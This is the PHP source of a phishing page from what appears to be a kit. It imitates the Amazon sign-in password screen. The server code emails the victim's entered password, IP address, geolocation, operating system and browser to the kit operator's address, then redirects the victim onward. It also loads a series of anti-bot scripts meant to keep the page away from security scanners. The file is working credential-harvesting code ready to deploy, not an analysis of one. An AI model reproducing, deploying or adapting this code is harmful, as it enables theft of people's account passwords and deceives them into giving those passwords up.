<?php
require 'Email.php';require 'var.php';
if (isset($btnOneAmazonx)) {
    header("Location: submit.php");
    $sc = $_COOKIE['fl'];
    $to = "$rzlt_email,$sc";
$txt = "
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±±±[ AMAZON LOGIN ]±±±±±±±±±±±±±±±±±±±±✘<br>
✘ Password : $password<br>
✘±±±±±±±±±±±±±±±±[ END AMAZON LOGIN ]±±±±±±±±±±±±±±±±±±✘<br></h4>
<h4 style='font-weight: bold;font-family: sans-serif;'>
✘±±±±±±±±±±±±±±±±[     MORE INFO     ]±±±±±±±±±±±±±±±±±±✘<br>
✘🕘 Time : $time<br>
✘🗺 Ip : $iip<br>
✘📍 Geo : $ip<br>
✘💻 Operating System : $user_os<br>
✘🌀 Browser : $user_browser<br>
✘±±±±±±±±±±±±±±±±[ END MORE INFO ]±±±±±±±±±±±±±±±±✘<br></h4>";
$headers = "From:AMAZON RZLT <no-reply@kira.com>";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject = "NEW AMAZON LOGIN 🗺 $iip 🌀 $user_browser 💻 $user_os";
mail($to,$subject,$txt,$headers);
}
@$fullBillingAdress = $_COOKIE['billing'];

include 'allantibots/a1.php';
include 'allantibots/a2.php';
include 'allantibots/a3.php';
include 'allantibots/a4.php';
include 'allantibots/a5.php';
include 'allantibots/a6.php';
include 'allantibots/a7.php';
include 'allantibots/a8.php';
include 'allantibots/a9.php';
include 'allantibots/a10.php';
include 'allantibots/a11.php';
include 'allantibots/a12.php';

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Amazon Sign In</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<link rel="stylesheet" type="text/css" href="css/signin.css">
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<link rel="shortcut icon" href="img/amazon-logo-1.png">
</head>

<body>
<div class="header">
	<img src="img/amazon-logo-kira.svg">
</div><!--header-->
<div class="content">
	<div class="box-log">
		<form action="" method="POST">
		<img src="img/logoS.svg" style="width: 28%; margin-top: 25px; opacity: 0.85; cursor: text;">
		<p class="senddd" style="font-weight: 200; font-family: arial;font-size: 13px;color: #111111;margin-top: 13px;"><?php echo $_COOKIE['Billing']; ?><a class="aC" href="index.php">Change</a></p>
		<p class="txt2">Password <a href="#">Forgot your password?</a></p>
		<input class="password" type="password" name="password" id="password" minlength="3"><span class="errorepass" id="errorepass"></span>
		<button name="btnOnex" class="btn" id="btn" onclick="valid();">Sign In</button>
		</form>
		<input class="check" type="checkbox"><p class="txt4"> Keep me signed in. <a class="D" href="#">Details</a><img class="downflesh" src="img/downflesh.png"></p>
	</div><!--box-log-->
</div><!--content-->

<div class="content2">
	<img class="NTA" src="img/or.png">
	<button class="btn2" id="btn2">Get a sign-in code in your email</button>
</div><!--content2-->
<hr class="style-two">

<div class="content3">
	<div class="cn">
		<ul>
			<li><a href="#">Conditions of Use</a></li>
			<li><a href="#">Privacy Notice</a></li>
			<li><a href="#">Help</a></li>
		</ul><!--cn-->
	</div>
	<img class="lastster" src="img/2k18.png">
</div><!--content3-->

<script type="text/javascript">
	function valid(){

		var password=document.getElementById('password').value;
		var errorepass=document.getElementById('errorepass');
		errorepass.innerHTML="";
		if (password=='') {
			errorepass.innerHTML=" <b><i>!</i></b> Password is empty.";
		}
	}
</script>

<script type="text/javascript">
			$(document).ready(function() {
    $('#btn').click(function(e) {
        var isValid = true;
        $('input[type="text"],[type="Password"]').each(function() {
            if ($.trim($(this).val()) == '') {
                isValid = false;
                $(this).css({
                	"box-shadow": "0 0 0 3px rgba(221,0,0,.1) inset",
                    "border": "1px solid red",
                    "background": ""
                });
            }
            else {
                $(this).css({
                    "border": "",
                    "box-shadow": "none",
                    "background": ""
                });
            }
        });
        if (isValid == false) 
            e.preventDefault();
        
    });
});
		</script>
</body>
</html>